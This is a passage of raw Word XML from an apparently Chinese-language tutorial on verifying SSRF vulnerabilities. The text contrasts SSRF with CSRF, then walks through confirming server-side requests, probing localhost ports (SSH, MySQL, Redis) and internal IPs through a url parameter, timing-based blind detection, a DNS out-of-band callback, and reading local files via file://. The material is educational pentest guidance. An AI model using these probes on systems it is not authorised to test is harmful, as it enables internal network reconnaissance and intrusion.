      <w:tr w:rsidR="002E49D8" w14:paraId="0BC04EE3" w14:textId="77777777" w:rsidTr="002E4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600189" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>请求发起者</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7627C067" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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用户浏览器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E0D353D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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目标服务器</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="722527DE" w14:textId="77777777" w:rsidTr="002E49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9F1954" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>攻击目</w:t>
            </w:r>
            <w:r>
              <w:t>标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="519B9490" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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用户可操作的</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> Web </w:t>
            </w:r>
            <w:r>
              <w:t>功能</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="589F4BA0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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内网</w:t>
            </w:r>
            <w:r>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>本机</w:t>
            </w:r>
            <w:r>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>云</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> Metadata</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="652B4D30" w14:textId="77777777" w:rsidTr="002E4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775B53" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:r>
              <w:t>利用权限</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7BF73360" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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用户权限</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="557ADADE" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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服务器权限（通常更高）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="088E4B84" w14:textId="77777777" w:rsidTr="002E49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3D22C6" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>是否过防火墙</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="496BD4D4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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否（从用户网络访问）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48D0AD1F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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是（从服务器内网发出）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002E49D8" w14:paraId="08AF5BF0" w14:textId="77777777" w:rsidTr="002E4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F3C4D8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>协议范围</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="03D36DA9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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一般只有</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> HTTP/HTTPS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6122A20B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951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file://, dict://, gopher:// </w:t>
            </w:r>
            <w:r>
              <w:t>等</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A66B4CB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8"/>
    <w:p w14:paraId="6132A8D6" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>简单记住：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">CSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>你的浏览器偷偷发请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务器偷偷帮你发请求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6F83F274" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>三、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>漏洞验证方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F94EBE" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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判断是否</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务端发请求</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7E4E9993" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>拿到一个可能产生</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的功能点后，第一步判断请求是浏览器发的还是服务器发的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28669257" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>方法（以图片</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>场景为例）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0208E9DA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>找个外部图片</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测试：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>=http://www.baidu.com/img/bd_logo1.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B00064C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(2) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>打开浏览器</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> F12 -&gt; Network </w:t>
      </w:r>
      <w:r>
        <w:t>面板，观察请求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFE4AA2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如果浏览器直接请求了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> baidu.com -&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>不是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>（说明是前端直接加载图片）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4881FC19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如果只有目标服务器的请求，没有到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> baidu.com </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>（服务器帮你去拿了图片）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB11D5B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(3) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>确认是服务端发起后，把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>改成内网地址测试：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>http://127.0.0.1:8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBFF078" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(4) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>观察响应差异：响应内容</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>状态码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>报</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>错信息</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>响应时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3478FF37" w14:textId="4C8C84CB" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>提示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>核心三招：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>判断是否</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务端发请求</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> (2) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测内网</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>看响应差异</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> (3) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> file:// </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>读本地文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA836BC" w14:textId="77777777" w:rsidR="00951A4C" w:rsidRPr="00951A4C" w:rsidRDefault="00951A4C" w:rsidP="00951A4C">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>实战例子（三板斧</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42489BF8" w14:textId="77777777" w:rsidR="00951A4C" w:rsidRPr="00951A4C" w:rsidRDefault="00951A4C" w:rsidP="00951A4C">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00951A4C">
        <w:lastRenderedPageBreak/>
        <w:t>看时间差（盲打技巧</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>）：</w:t>
      </w:r>
      <w:r w:rsidRPr="00951A4C">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>如果页面没有回显（Blind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t xml:space="preserve"> SSRF），利用时间差判断。例如分别请求 http://127.0.0.1:22（SSH通常超时很长）和 http://127.0.0.1:80（端口关闭会快速返回RST包）。如果响应时间不同，说明服务器确实帮你连了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7694527B" w14:textId="77777777" w:rsidR="00951A4C" w:rsidRPr="00951A4C" w:rsidRDefault="00951A4C" w:rsidP="00951A4C">
      <w:r w:rsidRPr="00951A4C">
        <w:t>用 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>Interactsh（DNS外带</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>）：</w:t>
      </w:r>
      <w:r w:rsidRPr="00951A4C">
        <w:br/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>提交 ?url</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00951A4C">
        <w:t>=http://your-unique-id.oast.fun。如果服务器发起了DNS请求查询 your-unique-id.oast.fun，那就100%确认存在SSRF。这是最无痛的验证方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CF456C" w14:textId="77777777" w:rsidR="00951A4C" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20E3AFBB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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内网探测测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D96F1A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>确认存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>后，测试目标服务器所</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>在内网</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的可达情况：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05880DF1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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">=http://127.0.0.1:22        # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测试本机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8B93B1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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">=http://127.0.0.1:3306 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">     # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测试本机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38ADCF88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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">=http://127.0.0.1:6379      # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测试本机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFF7343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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">=http://192.168.1.1:80      # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测试内网网关</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F5CFE5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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">=http://10.0.0.1:443        # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>测试其他内网段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79355616" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E34784A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>判断方法</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF770C0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响应超时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>端口关闭或防火墙拦截</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AD1C43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快速返回异常内容</w:t>
      </w:r>
      <w:r>
